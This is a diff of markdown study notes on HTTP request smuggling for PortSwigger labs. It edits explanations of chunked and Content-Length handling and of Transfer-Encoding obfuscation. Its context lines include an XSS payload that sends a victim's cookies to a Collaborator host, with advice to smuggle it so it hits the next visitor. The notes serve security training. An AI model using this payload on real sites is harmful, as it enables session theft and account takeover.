@@ -178,9 +178,9 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 
 ## HTTP Request Smuggling
 
->Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding(HEX) or content-length(Decimal).  Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.
+>Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
   
-<sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>   
+>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  
 
 ### Content-Length Capture victim requests
 
@@ -227,7 +227,7 @@ csrf=nVFjkw2QdI4G6hDY9nW39x0KOtFebyAd&postId=8&name=c&email=c%40c.c&website=&com
 a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
 ```  
 
->Smuggle this XSS request to the back-end server, so that it exploits the next visitor.  
+>Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in UserAgent header.  
 
 ```html
 POST / HTTP/1.1
@@ -256,7 +256,7 @@ x=1
 
 ### Dualchunk TE  
 
->If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  
+>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use obfuscating techniques with second TE.  
 
 <sub>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way. Ways to obfuscate the Transfer-Encoding header. For example:</sub>  
 
@@ -279,7 +279,7 @@ x=1
   
 ```  
 
->**Note:** You need to include the trailing sequence \r\n\r\n following the final 0.  
+>**Note:** You need to include the trailing sequence \r\n\r\n following the final **0**.  
 
 [PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
 
